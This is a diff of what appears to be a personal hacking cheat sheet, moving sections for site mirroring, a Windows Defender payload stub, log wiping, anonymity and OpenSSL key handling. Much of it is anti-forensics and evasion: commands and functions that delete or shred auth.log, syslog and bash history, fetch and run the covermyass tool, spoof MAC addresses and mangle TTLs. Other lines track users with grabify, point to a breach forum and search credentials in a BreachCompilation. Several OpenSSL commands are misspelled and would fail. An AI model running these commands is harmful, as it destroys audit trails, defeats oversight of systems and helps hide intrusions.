@@ -120,41 +120,15 @@ nslookup [[ping with both 'www' and naked domain]
 use censys to find history between server, origin and destination. 
 [https://github.com/censys/censys-python]
 
+----------------------------------------------[COPY WEBPAGE ] -------------------------------------------------]
+sudo apt install httrack webhttrack
+httprack -w domain.com
+tempmailer.de --> Use throw away email 
 
 ----------------------------------------------[Windows Defender Payload] -------------------------------------------------]
 [dsviper] 
 enter info
 create python server to deliver payload 
-
----------------------------------------------------PGP-GPG-----------------------------------------------
-
-
-######## OPEN SSL #######
-# use private key to sign secret.enc. 
-openssl genrsa -aes-256-cbc -out newkey.key 4096 # generate pvt key 
-openssl rsa -in newkey.key -pubout > public.key # to generate public key 
-openssl rsatl --encrypt -inkey private.key -pubout > public.key -pubin -in messsage.txt -out message.enc ## encrypt a file 
-openssl rsatl --decrypt -inkey myprivate.key -in message.enc > clear_view.txt 
-openssl genrsa -des3 -out another_pvt_key.key 4096 ## to derive anothers public key 
-
-openssl rsautl --decruypt -inkey bob-put.key -in secret.enc > message.txt  # to decrypt mesg
-openssl dgst -sha256 -sign private.key -out signer secret.enc
-openssl base64 -in signer -out my_signature # to sign ssl 
-openssl dgst -sha256 -verify anothers_pub_key.key -signature signer secret.enc 
-
-
---> OPEN SSL ENCRYPTION
-Private key
-openssl genrsa -aes-256-cbc -out macair.key 4096
-openssl genrsa -aes-256-cbc -out macair.key 4096
-# Public key
-openssl rsa -in frank.key -pubout > frankpublic.key
-# verification file
-### making signed encryption
-openssl dgst -sha256 -sign macair.key -out signer verifcation.enc
-# to sign
-openssl base64 -in signer -out verifcation.enc
-
 
 ---------------------------------------------------QUICK-WEBSERVER-----------------------------------------------
 
@@ -184,79 +158,6 @@ function monitorWIFI() {
 	sudo iwgetid # reports current essid
 }
 monitorWIFI
-------------------------------------------------------SHRED_LOG_DATA------------------------------------------------
-
-## NMAP SCRIPT LOCATION 
-ls -al /usr/share/nmap/scripts/ 
-
-## CANARY TOKENS
-canarytokens.com/generate 
-
-### LOGS ##### 
-```exits the terminal without saving history ```
-kill -9 $$ 
-wget https://raw.githubusercontent.com/sundowndev/covermyass/master/covermyass
-chmod +x covermyass
-./covermyass
-# BASH HISTORY 
-cd /dev/shm/
-rm /root/.bash_history 
-## or edit the var $HISTSIZE and $HISTFILESIZE 
-# AUTH-LOG FILES 
-cd /var/log
-sudo rm auth.log 
-shred -zu /var/log/auth.log ## safely overwrite logs with 0's and 1's 
-truncate -s 0 /var/log/auth.log 
-
------------------------------------------------------- SHRED SESSION & TERMINAL  LOGS --------------------------------------------
-
-function _removeSSHLogs() {
-	sudo find _sshMSG -type f -exec shred -n 10 {} \ && sudo find /var/log/syslog -type f -exec shred -n 10 {} \;
-	sudo find ~/.ssh/github_rsa.pub -type f -exec shred -n 10 {}
-}
-function _removeAllLogs() {
-	echo "[!] Removing Logs.. \n\t Old Logs\n $(lastlog)"
-	sudo find *.log -type f -exec shred -n 10 {} \ && sudo find /var/log -type f -exec shred -n 10 {} # for logs
-	cat /dev/null > ~/.bash_history && history -c && exit ## to remove history
-	sudo grep -r *.log _sysLogs | sudo rm sysLogs ## just in case #1 doesnt wrok
-	rm /root/.bash_history
-	dmesg | less && _checkLogs
-	sudo covermyass now 
-}
-
-function _checkLogs() { cat ./bash_history }
-
------------------------------------------------------- STAY ANONYMOUS ------------------------------------------------------
-macchanger -r [channges mac to a random number] 
-i2prouter start [#### IP2ROUTER --> File sharing / hosting ]
-tor + proxy 
-vpn (most cant be trusted) 
-https://inteltechniques.com/ [THrow away emails]
-tempmailer.de 
-https://api.wigle.net/ [excellent gps and realtime tracking tool] 
-shodan.io ## --> d[simular to wiggle, but contains open streams and devices] 
-https://null-byte.wonderhowto.com/how-to/wardrive-android-phone-map-vulnerable-networks-0176136/
-
-grabify.link  ## --> track usersr 
-https://nvd.nist.gov/developers/vulnerabilities
-https://www.exploit-db.com/
-securityfocus.com
-https://sur.ly/i/breachforums.com/
-namecheckup.com ## --> osnit 
-https://neatnik.net/steganographr/ --> stenography (*to hide tracks) 
-
-### MANGLE TTL 
-# WINDOWS 
-netsh int ipv4 set glob defaultcurhoplimit=65
-netsh int ipv6 set glob defaultcurhoplimit=65
-netsh int ipv6 set glob defaultcurhoplimit=128 # <-- RESET BACK TO DEFUALT 
-
-
-### LINUX (default ttl=64)
-iptables -t mangle -I POSTROUTING 1 -j TTL --ttl-set 66
-########################
-
-## make abunch of differnt APS 
 
 ------------------------------------------------------ BASIC RECON ------------------------------------------------------
 
@@ -654,6 +555,108 @@ nano config.json
 ## ADD SITES TO CONFIG FILE 
 python noisy.py --config config.json
 
+------------------------------------------------------SHRED_LOG_DATA------------------------------------------------
+
+## NMAP SCRIPT LOCATION 
+ls -al /usr/share/nmap/scripts/ 
+
+## CANARY TOKENS
+canarytokens.com/generate 
+
+### LOGS ##### 
+```exits the terminal without saving history ```
+kill -9 $$ 
+wget https://raw.githubusercontent.com/sundowndev/covermyass/master/covermyass
+chmod +x covermyass
+./covermyass
+# BASH HISTORY 
+cd /dev/shm/
+rm /root/.bash_history 
+## or edit the var $HISTSIZE and $HISTFILESIZE 
+# AUTH-LOG FILES 
+cd /var/log
+sudo rm auth.log 
+shred -zu /var/log/auth.log ## safely overwrite logs with 0's and 1's 
+truncate -s 0 /var/log/auth.log 
+
+------------------------------------------------------ SHRED SESSION & TERMINAL  LOGS --------------------------------------------
+
+function _removeSSHLogs() {
+	sudo find _sshMSG -type f -exec shred -n 10 {} \ && sudo find /var/log/syslog -type f -exec shred -n 10 {} \;
+	sudo find ~/.ssh/github_rsa.pub -type f -exec shred -n 10 {}
+}
+function _removeAllLogs() {
+	echo "[!] Removing Logs.. \n\t Old Logs\n $(lastlog)"
+	sudo find *.log -type f -exec shred -n 10 {} \ && sudo find /var/log -type f -exec shred -n 10 {} # for logs
+	cat /dev/null > ~/.bash_history && history -c && exit ## to remove history
+	sudo grep -r *.log _sysLogs | sudo rm sysLogs ## just in case #1 doesnt wrok
+	rm /root/.bash_history
+	dmesg | less && _checkLogs
+	sudo covermyass now 
+}
+
+function _checkLogs() { cat ./bash_history }
+
+------------------------------------------------------ STAY ANONYMOUS ------------------------------------------------------
+macchanger -r [channges mac to a random number] 
+i2prouter start [#### IP2ROUTER --> File sharing / hosting ]
+tor + proxy 
+vpn (most cant be trusted) 
+https://inteltechniques.com/ [THrow away emails]
+tempmailer.de 
+https://api.wigle.net/ [excellent gps and realtime tracking tool] 
+shodan.io ## --> d[simular to wiggle, but contains open streams and devices] 
+https://null-byte.wonderhowto.com/how-to/wardrive-android-phone-map-vulnerable-networks-0176136/
+
+grabify.link  ## --> track usersr 
+https://nvd.nist.gov/developers/vulnerabilities
+https://www.exploit-db.com/
+securityfocus.com
+https://sur.ly/i/breachforums.com/
+namecheckup.com ## --> osnit 
+https://neatnik.net/steganographr/ --> stenography (*to hide tracks) 
+
+### MANGLE TTL 
+# WINDOWS 
+netsh int ipv4 set glob defaultcurhoplimit=65
+netsh int ipv6 set glob defaultcurhoplimit=65
+netsh int ipv6 set glob defaultcurhoplimit=128 # <-- RESET BACK TO DEFUALT 
+
+
+### LINUX (default ttl=64)
+iptables -t mangle -I POSTROUTING 1 -j TTL --ttl-set 66
+########################
+
+## make abunch of differnt APS 
+
+---------------------------------------------------PGP-GPG-----------------------------------------------
+
+
+######## OPEN SSL #######
+# use private key to sign secret.enc. 
+openssl genrsa -aes-256-cbc -out newkey.key 4096 # generate pvt key 
+openssl rsa -in newkey.key -pubout > public.key # to generate public key 
+openssl rsatl --encrypt -inkey private.key -pubout > public.key -pubin -in messsage.txt -out message.enc ## encrypt a file 
+openssl rsatl --decrypt -inkey myprivate.key -in message.enc > clear_view.txt 
+openssl genrsa -des3 -out another_pvt_key.key 4096 ## to derive anothers public key 
+
+openssl rsautl --decruypt -inkey bob-put.key -in secret.enc > message.txt  # to decrypt mesg
+openssl dgst -sha256 -sign private.key -out signer secret.enc
+openssl base64 -in signer -out my_signature # to sign ssl 
+openssl dgst -sha256 -verify anothers_pub_key.key -signature signer secret.enc 
+
+
+--> OPEN SSL ENCRYPTION
+Private key
+openssl genrsa -aes-256-cbc -out macair.key 4096
+openssl genrsa -aes-256-cbc -out macair.key 4096
+# Public key
+openssl rsa -in frank.key -pubout > frankpublic.key
+# verification file
+### making signed encryption
+openssl dgst -sha256 -sign macair.key -out signer verifcation.enc
+# to sign
+openssl base64 -in signer -out verifcation.enc
 
 
 
@@ -675,11 +678,7 @@ nano targets.txt
 python3 h8mail.py -t '/root/h8mail/targets.txt' -bc '~/BreachCompilation' --local
 
 
-#### TO MIRROR WEBPAGE DATA (EXACT COPY)
-sudo apt install httrack webhttrack
-httprack -w domain.com
-## throw-away email ## 
-tempmailer.de 
+
 
 
 ################################################
